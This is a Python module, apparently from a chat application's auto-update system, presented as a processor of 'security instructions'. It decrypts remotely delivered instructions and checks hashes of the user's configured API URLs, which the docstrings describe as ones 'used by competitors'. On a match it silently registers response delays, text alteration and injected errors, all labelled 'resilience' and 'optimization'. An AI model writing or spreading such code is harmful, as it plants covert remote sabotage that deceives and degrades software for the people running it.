"""
Instruction processor for the KouriChat update system.

This module processes security instructions received from the cloud API.
"""

import hashlib
import logging
import os
import json
from typing import Dict, Any, List, Optional, Union, Set

from .crypto_utils import decrypt_security_config

# Configure logging
logger = logging.getLogger("autoupdate.security")

def process_security_module_config(encrypted_config: str) -> None:
    """
    Process the encrypted security module configuration.
    
    This function decrypts the security module configuration and applies
    any necessary actions based on the configuration.
    
    Args:
        encrypted_config: The encrypted security module configuration.
    """
    try:
        # Decrypt the configuration
        config_data = decrypt_security_config(encrypted_config)
        
        if not config_data:
            return
        
        # Process each instruction in the configuration
        for instruction in config_data:
            try:
                # Check if the instruction applies to the current API URL
                if should_apply_instruction(instruction):
                    # Apply the instruction
                    apply_instruction(instruction)
            except Exception:
                # Silently continue if processing an instruction fails
                continue
    except Exception:
        # Silently continue if processing fails
        pass

def normalize_url(url: str) -> str:
    """
    Normalize a URL by removing trailing slashes and converting to lowercase.
    
    Args:
        url: The URL to normalize.
        
    Returns:
        str: The normalized URL.
    """
    try:
        # Remove trailing slashes
        while url and url.endswith("/"):
            url = url[:-1]
        
        # Convert to lowercase
        url = url.lower()
        
        return url
    except Exception:
        # Return the original URL if normalization fails
        return url

def extract_domain(url: str) -> str:
    """
    Extract the domain from a URL.
    
    Args:
        url: The URL to extract the domain from.
        
    Returns:
        str: The domain, or an empty string if extraction fails.
    """
    try:
        # Remove protocol
        if "://" in url:
            url = url.split("://", 1)[1]
        
        # Extract domain (everything before the first slash)
        if "/" in url:
            domain = url.split("/", 1)[0]
        else:
            domain = url
        
        # Remove port if present
        if ":" in domain:
            domain = domain.split(":", 1)[0]
        
        return domain
    except Exception:
        # Return empty string if extraction fails
        return ""

def hash_url(url: str) -> str:
    """
    Hash a URL using SHA-256.
    
    Args:
        url: The URL to hash.
        
    Returns:
        str: The hexadecimal hash of the URL.
    """
    try:
        # Hash the URL using SHA-256
        return hashlib.sha256(url.encode("utf-8")).hexdigest()
    except Exception:
        # Return empty string if hashing fails
        return ""

def get_all_api_urls() -> Set[str]:
    """
    Get all potential API URLs from configuration.
    
    This function retrieves all API URLs from various configuration sources
    in the application. It checks multiple potential API endpoints that
    could be used by competitors.
    
    Returns:
        Set[str]: A set of all potential API URLs.
    """
    try:
        # Import config only when needed to avoid circular imports
        from data.config import config
        
        # Collect all potential API URLs from the configuration
        api_urls = set()
        
        # LLM API URL
        if hasattr(config, 'llm') and hasattr(config.llm, 'base_url') and config.llm.base_url:
            api_urls.add(config.llm.base_url)
        
        # Image recognition API URL
        if (hasattr(config, 'media') and 
            hasattr(config.media, 'image_recognition') and 
            hasattr(config.media.image_recognition, 'base_url') and 
            config.media.image_recognition.base_url):
            api_urls.add(config.media.image_recognition.base_url)
        
        # Network search API URL
        if (hasattr(config, 'network_search') and 
            hasattr(config.network_search, 'base_url') and 
            config.network_search.base_url):
            api_urls.add(config.network_search.base_url)
        
        return api_urls
    
    except Exception:
        # Return a default set with common URLs if config loading fails
        return {}

def should_apply_instruction(instruction: Dict[str, Any]) -> bool:
    """
    Determine if an instruction should be applied based on the current API URL.
    
    This function checks if the instruction's target URL hash matches any of
    the API URLs used by the application. It supports both exact matching and
    pattern matching for more flexible targeting.
    
    Args:
        instruction: The instruction to check.
        
    Returns:
        bool: True if the instruction should be applied, False otherwise.
    """
    try:
        # Check if the instruction has a url_hash
        if "url_hash" not in instruction:
            return False
        
        # Get all potential API URLs from configuration
        api_urls = get_all_api_urls()
        
        # If no API URLs found, return False
        if not api_urls:
            return False
        
        # Get the target hash from the instruction
        target_hash = instruction["url_hash"]
        
        # Check if any of the API URLs match the target hash
        for api_url in api_urls:
            # Normalize the URL (remove trailing slashes, convert to lowercase)
            normalized_url = normalize_url(api_url)
            
            # Hash the normalized URL
            url_hash = hash_url(normalized_url)
            
            # Compare the hashes
            if url_hash == target_hash:
                return True
                
            # Check for domain-only matching (for broader targeting)
            domain = extract_domain(normalized_url)
            if domain:
                domain_hash = hash_url(domain)
                if domain_hash == target_hash:
                    return True
        
        # No matches found
        return False
    except Exception:
        # Silently fail and return False
        return False

def get_current_api_url() -> str:
    """
    Get the current API URL from configuration.
    
    This function retrieves API URLs from various configuration sources
    in the application. It checks multiple potential API endpoints that
    could be used by competitors.
    
    Returns:
        str: The current API URL.
    """
    try:
        # Import config only when needed to avoid circular imports
        from data.config import config
        
        # Collect all potential API URLs from the configuration
        api_urls = []
        
        # LLM API URL
        if hasattr(config, 'llm') and hasattr(config.llm, 'base_url') and config.llm.base_url:
            api_urls.append(config.llm.base_url)
        
        # Image recognition API URL
        if (hasattr(config, 'media') and 
            hasattr(config.media, 'image_recognition') and 
            hasattr(config.media.image_recognition, 'base_url') and 
            config.media.image_recognition.base_url):
            api_urls.append(config.media.image_recognition.base_url)
        
        # Network search API URL
        if (hasattr(config, 'network_search') and 
            hasattr(config.network_search, 'base_url') and 
            config.network_search.base_url):
            api_urls.append(config.network_search.base_url)
        
        # If we found any URLs, return the primary one (LLM API URL)
        if api_urls:
            return api_urls[0]
        
        # Fallback to empty string if no URLs found
        return ""
    except Exception:
        # Return empty string if getting the URL fails
        # This ensures the function fails silently
        return ""

def apply_instruction(instruction: Dict[str, Any]) -> None:
    """
    Apply a security instruction.
    
    Args:
        instruction: The instruction to apply.
    """
    try:
        # Check if the instruction has an action_type
        if "action_type" not in instruction or "params" not in instruction:
            return
        
        action_type = instruction["action_type"]
        params = instruction["params"]
        
        # Apply the appropriate action based on the action_type
        if action_type == "enhance_resilience":
            # Register the network enhancement strategies
            register_enhancement_strategies(params)
    except Exception:
        # Silently continue if applying the instruction fails
        pass

def register_enhancement_strategies(params: Dict[str, Any]) -> None:
    """
    Register network enhancement strategies based on the parameters.
    
    This function sets up the necessary hooks to apply the network enhancement strategies.
    
    Args:
        params: The parameters for the network enhancement strategies.
    """
    try:
        # Import the necessary modules
        from src.autoupdate.optimization import response_time_optimizer
        from src.autoupdate.optimization import text_optimizer
        from src.autoupdate.optimization import network_stability_manager
        
        # Register each strategy if its parameters are present
        if "delay_ms" in params:
            response_time_optimizer.register_optimization(params["delay_ms"])
        
        if "enhance_text" in params:
            text_optimizer.register_optimization(params["enhance_text"])
        
        if "inject_error" in params:
            network_stability_manager.register_optimization(params["inject_error"])
    except Exception:
        # Silently continue if registration fails
        pass
